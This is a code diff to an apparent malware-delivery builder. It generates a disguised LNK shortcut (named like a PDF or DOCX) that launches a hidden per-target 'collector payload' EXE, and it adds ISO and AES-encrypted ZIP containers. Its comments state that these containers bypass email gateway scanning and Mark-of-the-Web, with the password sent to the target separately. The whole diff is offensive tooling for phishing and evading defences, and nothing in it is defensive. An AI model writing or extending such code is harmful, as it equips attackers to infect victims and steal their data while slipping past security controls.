@@ -5,7 +5,9 @@ import tempfile
 import threading
 import zipfile
 
+import pycdlib
 import pylnk3
+import pyzipper
 
 from .exe_builder import BASE_DIR, BUILD_DIR, OUTPUT_DIR, build_exe
 from .config_manager import load_config, resolve_exe_name
@@ -15,6 +17,15 @@ LNK_REGISTRY_PATH = os.path.join(BASE_DIR, 'data', 'lnk_registry.json')
 # Disguised extension used for both the LNK name and its icon
 LURE_EXT_CHOICES = ('pdf', 'docx', 'xlsx', 'zip')
 DEFAULT_LURE_EXT = 'pdf'
+
+# Delivery container: plain ZIP, ISO image, or password-protected ZIP wrapping the ISO
+CONTAINER_CHOICES = (
+    ('zip', 'ZIP 压缩包', '直接投递 ZIP，兼容性最好。'),
+    ('iso', 'ISO 镜像', '以光盘镜像投递，绕过部分邮件网关对压缩包的检查（Windows 可直接装载）。'),
+    ('iso_zip', 'ISO + 密码 ZIP', 'ISO 再套一层 AES 加密 ZIP，避免网关扫描与 MOTW 传播，密码需另行告知目标。'),
+)
+CONTAINER_KEYS = tuple(key for key, _, _ in CONTAINER_CHOICES)
+DEFAULT_CONTAINER = 'zip'
 
 # System icons available on stock Windows; used because a custom .ico cannot
 # be referenced reliably from an extracted archive.
@@ -106,9 +117,20 @@ def _safe_name(name):
     return name.strip(' .') or 'target'
 
 
-def lnk_zip_name(target_name, token, exe_filename=''):
+def lnk_artifact_name(target_name, token, exe_filename='', container=None):
+    if container is None:
+        container = _container(load_config())
     base = _safe_name(resolve_exe_name(target_name, token, exe_filename))
-    return base + '.zip'
+    return base + ('.iso' if container == 'iso' else '.zip')
+
+
+def _container(config):
+    container = str(config.get('lnk_container', DEFAULT_CONTAINER)).lower()
+    return container if container in CONTAINER_KEYS else DEFAULT_CONTAINER
+
+
+def _zip_password(config):
+    return str(config.get('lnk_zip_password', '') or '').strip()[:128]
 
 
 def _lure_ext(config):
@@ -156,6 +178,107 @@ def _add_hidden_dir(zf, arcname):
     info.external_attr = 0x16  # directory | hidden | system
     info.compress_type = zipfile.ZIP_STORED
     zf.writestr(info, b'')
+
+
+def _write_zip_package(staging_dir, lnk_path, lnk_name, folder, hidden_files,
+                       zip_path):
+    arc_folder = folder.replace('\\', '/')
+    parts = arc_folder.split('/')
+    tmp_zip = zip_path + '.part'
+    with zipfile.ZipFile(tmp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
+        zf.write(lnk_path, lnk_name)
+        for i in range(1, len(parts) + 1):
+            _add_hidden_dir(zf, '/'.join(parts[:i]))
+        for name in hidden_files:
+            _add_hidden_file(zf, f'{arc_folder}/{name}',
+                             os.path.join(staging_dir, *parts, name))
+    os.replace(tmp_zip, zip_path)
+
+
+def _iso_dir_names(parts):
+    """ISO9660 directory names (8 chars max); UDF/Joliet keep display names."""
+    names = []
+    for idx, part in enumerate(parts):
+        if part.upper() == '__MACOSX':
+            names.append('__MACOSX')
+        else:
+            names.append(f'CACHE_{idx}')
+    return names
+
+
+def _joliet_component(name):
+    """pycdlib caps Joliet components at 64 UTF-8 bytes; truncate long names."""
+    if len(name.encode('utf-8')) <= 64:
+        return name
+    stem, dot, ext = name.rpartition('.')
+    suffix = ('.' + ext) if dot else ''
+    budget = 64 - len(suffix.encode('utf-8'))
+    kept = ''
+    for ch in stem:
+        if len((kept + ch).encode('utf-8')) > budget:
+            break
+        kept += ch
+    return (kept or 'document') + suffix
+
+
+def _write_iso_package(staging_dir, lnk_path, lnk_name, folder, hidden_files,
+                       iso_path):
+    """Write the launcher and payload folder as an ISO9660/Joliet/UDF image.
+
+    UDF carries the full Unicode lure name (Joliet truncates it); Windows 10+
+    mounts the UDF volume. ISO has no DOS hidden attribute, so the payload
+    folder stays visible; use the ``macosx`` evasion option to disguise it.
+    """
+    parts = folder.split('\\')
+    iso_dirs = _iso_dir_names(parts)
+    folder_dir = os.path.join(staging_dir, *parts)
+    iso_folder = '/' + '/'.join(iso_dirs)
+    udf_folder = '/' + '/'.join(parts)
+    tmp_iso = iso_path + '.part'
+
+    iso = pycdlib.PyCdlib()
+    try:
+        iso.new(joliet=3, udf='2.60')
+        current = ''
+        for i, name in enumerate(iso_dirs):
+            current += '/' + name
+            iso.add_directory(
+                iso_path=current,
+                joliet_path='/' + '/'.join(parts[:i + 1]),
+                udf_path='/' + '/'.join(parts[:i + 1]),
+            )
+        iso.add_file(
+            lnk_path, iso_path='/DOCUMENT.LNK;1',
+            joliet_path='/' + _joliet_component(lnk_name),
+            udf_path='/' + lnk_name,
+        )
+        for name in hidden_files:
+            iso.add_file(
+                os.path.join(folder_dir, name),
+                iso_path=f'{iso_folder}/{name.upper()};1',
+                joliet_path=udf_folder + '/' + _joliet_component(name),
+                udf_path=udf_folder + '/' + name,
+            )
+        iso.write(tmp_iso)
+    finally:
+        iso.close()
+    os.replace(tmp_iso, iso_path)
+
+
+def _write_iso_zip(iso_path, zip_path, password):
+    tmp_zip = zip_path + '.part'
+    entry = os.path.basename(iso_path)
+    if password:
+        with pyzipper.AESZipFile(
+            tmp_zip, 'w', compression=pyzipper.ZIP_DEFLATED,
+            encryption=pyzipper.WZ_AES,
+        ) as zf:
+            zf.setpassword(password.encode('utf-8'))
+            zf.write(iso_path, entry)
+    else:
+        with zipfile.ZipFile(tmp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
+            zf.write(iso_path, entry)
+    os.replace(tmp_zip, zip_path)
 
 
 def _write_command_file(script_path, commands, ftp_mode):
@@ -302,26 +425,37 @@ def _payload_folder(token, evasion):
     return 'cache_' + token[:8]
 
 
-def build_lnk_zip(server_url, token, target_name, exe_filename=''):
-    """Build a target EXE and wrap it in a ZIP with a disguised LNK launcher.
+def build_lnk_package(server_url, token, target_name, exe_filename=''):
+    """Build a target EXE and wrap it in a ZIP/ISO with a disguised LNK launcher.
 
-    Layout after extraction:
+    Package layout:
         <doc-name>.pdf.lnk          visible shortcut
         <hidden folder>/viewer.exe  collector payload
         <hidden folder>/data.dat    command file that launches the payload
-    Optional evasion layers add run.vbs / run.bat and a decoy document.
+    Optional evasion layers add run.vbs / run.bat and a decoy document; the
+    container can be ZIP, ISO, or an AES-encrypted ZIP wrapping the ISO.
     """
     config = load_config()
     ext = _lure_ext(config)
     evasion = _evasion(config)
+    container = _container(config)
     use_vbs = bool(evasion & {'vbs', 'obfuscate', 'decoy'})
     use_conhost = 'conhost' in evasion
     use_decoy = 'decoy' in evasion
 
     exe_path = build_exe(server_url, token, target_name, exe_filename)
     base = _safe_name(resolve_exe_name(target_name, token, exe_filename))
-    zip_name = base + '.zip'
+    artifact_name = lnk_artifact_name(target_name, token, exe_filename, container)
+    artifact_path = os.path.join(OUTPUT_DIR, artifact_name)
     lnk_name = _lnk_display_name(base, ext)
+
+    # Container changes leave the old artifact behind under a different extension
+    old_name = get_lnk_filename(token)
+    if old_name and old_name != artifact_name:
+        try:
+            os.remove(os.path.join(OUTPUT_DIR, old_name))
+        except OSError:
+            pass
 
     os.makedirs(BUILD_DIR, exist_ok=True)
     staging = tempfile.mkdtemp(prefix=f'lnk_{token[:8]}_', dir=BUILD_DIR)
@@ -361,7 +495,6 @@ def build_lnk_zip(server_url, token, target_name, exe_filename=''):
         lnk_path = os.path.join(staging, lnk_name)
         _write_lnk(lnk_path, target, arguments, ext)
 
-        arc_folder = folder.replace('\\', '/')
         hidden_files = [payload_name]
         if use_vbs:
             hidden_files += [bat_name, vbs_name]
@@ -370,36 +503,41 @@ def build_lnk_zip(server_url, token, target_name, exe_filename=''):
         hidden_files.append(script_name)
 
         os.makedirs(OUTPUT_DIR, exist_ok=True)
-        zip_path = os.path.join(OUTPUT_DIR, zip_name)
-        tmp_zip = zip_path + '.part'
-        with zipfile.ZipFile(tmp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
-            zf.write(lnk_path, lnk_name)
-            parts = arc_folder.split('/')
-            for i in range(1, len(parts) + 1):
-                _add_hidden_dir(zf, '/'.join(parts[:i]))
-            for name in hidden_files:
-                _add_hidden_file(zf, f'{arc_folder}/{name}',
-                                 os.path.join(folder_dir, name))
-        os.replace(tmp_zip, zip_path)
+        if container == 'zip':
+            _write_zip_package(staging, lnk_path, lnk_name, folder,
+                               hidden_files, artifact_path)
+        else:
+            iso_path = os.path.join(OUTPUT_DIR, base + '.iso')
+            _write_iso_package(staging, lnk_path, lnk_name, folder,
+                               hidden_files, iso_path)
+            if container == 'iso':
+                artifact_name = os.path.basename(iso_path)
+                artifact_path = iso_path
+            else:
+                _write_iso_zip(iso_path, artifact_path, _zip_password(config))
+                try:
+                    os.remove(iso_path)
+                except OSError:
+                    pass
 
-        register_lnk(token, zip_name)
-        return zip_path
+        register_lnk(token, artifact_name)
+        return artifact_path
     finally:
         shutil.rmtree(staging, ignore_errors=True)
 
 
-def build_lnk_zips_batch(server_url, targets):
+def build_lnk_packages_batch(server_url, targets):
     results = []
     for t in targets:
         try:
-            zip_path = build_lnk_zip(
+            artifact_path = build_lnk_package(
                 server_url, t['token'], t['name'], t.get('exe_filename', ''))
             results.append({
                 'target_id': t['id'],
                 'name': t['name'],
                 'success': True,
-                'zip_path': zip_path,
-                'zip_name': os.path.basename(zip_path),
+                'package_path': artifact_path,
+                'package_name': os.path.basename(artifact_path),
             })
         except Exception as e:
             results.append({
